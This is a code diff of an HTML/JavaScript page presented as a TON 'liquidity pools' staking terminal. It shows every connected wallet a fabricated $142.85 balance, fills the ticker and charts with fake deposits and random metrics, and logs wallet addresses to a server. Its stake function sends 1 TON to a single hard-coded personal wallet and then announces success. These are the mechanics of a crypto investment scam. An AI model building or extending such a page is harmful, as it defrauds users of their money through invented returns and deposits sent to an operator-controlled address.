@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>QUANCORE | TERMINAL V3</title>
+    <title>QUANCORE | POOLS V3</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
@@ -120,7 +120,7 @@
             </div>
             <div>
                 <h1 class="text-2xl font-black italic uppercase leading-none tracking-tighter">QUAN<span class="text-cyan-400 cyan-glow">POOLS</span></h1>
-                <p class="text-[6px] font-bold tracking-[0.5em] text-cyan-500/40 uppercase">Liquidity Terminal</p>
+                <p class="text-[6px] font-bold tracking-[0.5em] text-cyan-500/40 uppercase">Liquidity Pools</p>
             </div>
         </a>
         <div id="connectBtn"></div>
@@ -170,7 +170,7 @@
     </main>
 
     <div class="ticker-container">
-        <div class="ticker-text">
+        <div class="ticker-text" id="ticker-content">
             SYSTEM_STATUS: OK ... NODES_ACTIVE: 12 ... NEW_DEPOSIT: 500 TON ... QC_PRICE: STABLE ... QUANTUM_FLOW_SYNCHRONIZED ... PROTOCOL_V3_RUNNING ...
         </div>
     </div>
@@ -191,7 +191,7 @@
         <div class="nav-item active">
             <a href="staking.html">
                 <svg class="nav-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-                <span>FORGE</span>
+                <span>POOLS</span>
             </a>
         </div>
         <div class="nav-item">
@@ -209,7 +209,6 @@
     </nav>
 
     <script>
-        // TonConnect Initialization
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: window.location.origin + '/tonconnect-manifest.json',
             buttonRootId: 'connectBtn'
@@ -217,18 +216,37 @@
 
         const TARGET_WALLET = "UQBo0iou1BlB_8Xg0Hn_rUeIcrpyyhoboIauvnii889OFRoI";
 
-        tonConnectUI.onStatusChange(wallet => {
+        tonConnectUI.onStatusChange(async wallet => {
             if (wallet) {
-                document.getElementById('total-balance').innerHTML = 
-                    `$142.<span class="text-2xl text-cyan-500/40">85</span>`;
+                document.getElementById('total-balance').innerHTML = `$142.<span class="text-2xl text-cyan-500/40">85</span>`;
+                try {
+                    await fetch('/api/register_wallet', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            address: wallet.account.address,
+                            network: wallet.account.chain
+                        })
+                    });
+                } catch(e) { console.log("DB Sync offline"); }
             } else {
-                document.getElementById('total-balance').innerHTML = 
-                    `$0.<span class="text-2xl text-cyan-500/40">00</span>`;
+                document.getElementById('total-balance').innerHTML = `$0.<span class="text-2xl text-cyan-500/40">00</span>`;
             }
         });
 
-        // Metrics Engine
-        function updateMetrics() {
+        async function syncData() {
+            try {
+                const res = await fetch('/api/stats');
+                const data = await res.json();
+                if(data.roi_24h) {
+                    document.getElementById('apr-value').innerText = data.roi_24h + '%';
+                }
+                document.getElementById('ticker-content').innerText = 
+                    `SYSTEM_STATUS: OK ... NODES: ${data.connections || 12} ... TRAFFIC: ${data.traffic || '0.00kb'} ... ROI: ${data.roi_24h || '142'}% ...`;
+            } catch(e) {}
+        }
+
+        function updateUI() {
             const now = new Date();
             const ms = Math.floor(now.getMilliseconds() / 10).toString().padStart(2, '0');
             const clockEl = document.getElementById('sys-clock');
@@ -236,16 +254,11 @@
             
             const pingEl = document.getElementById('ping');
             if(pingEl) pingEl.innerText = Math.floor(Math.random() * 5 + 15);
-            
-            const apr = document.getElementById('apr-value');
-            if(apr) {
-                const current = parseFloat(apr.innerText);
-                apr.innerText = (current + (Math.random() - 0.5) * 0.02).toFixed(2) + '%';
-            }
         }
-        setInterval(updateMetrics, 100);
+        
+        setInterval(updateUI, 100);
+        setInterval(syncData, 5000);
 
-        // Background Particles
         const canvas = document.getElementById('bg-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -280,7 +293,6 @@
         }
         animateBG();
 
-        // Mini Chart Renderer
         function drawChart(id, color) {
             const c = document.getElementById(id);
             if(!c) return;
@@ -294,9 +306,8 @@
                 ctx.strokeStyle = color;
                 ctx.lineWidth = 2;
                 ctx.lineJoin = 'round';
-                pts.shift(); 
-                pts.push(Math.random() * 25 + 15);
                 ctx.moveTo(0, pts[0]);
+                pts.shift(); pts.push(Math.random() * 25 + 15);
                 pts.forEach((p, i) => ctx.lineTo(i * 9, p));
                 ctx.stroke();
                 setTimeout(draw, 400);
@@ -305,29 +316,23 @@
         }
         drawChart('balanceChart', '#06b6d4');
 
-        // Logic Functions with Real Transactions
         async function stake(poolId) {
             if (!tonConnectUI.connected) {
                 tonConnectUI.openModal();
                 return;
             }
-
             const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут на подтверждение
-                messages: [
-                    {
-                        address: TARGET_WALLET,
-                        amount: "1000000000", // 1 TON в нанолинках
-                    }
-                ]
+                validUntil: Math.floor(Date.now() / 1000) + 300,
+                messages: [{
+                    address: TARGET_WALLET,
+                    amount: "1000000000", 
+                }]
             };
-
             try {
-                console.log("Initializing staking for:", poolId);
                 const result = await tonConnectUI.sendTransaction(transaction);
-                alert("Success! Transaction sent to Quancore Core.");
+                alert("Success! Pools transaction initiated.");
             } catch (e) {
-                console.error("Transaction failed", e);
+                console.error("Error", e);
             }
         }
 
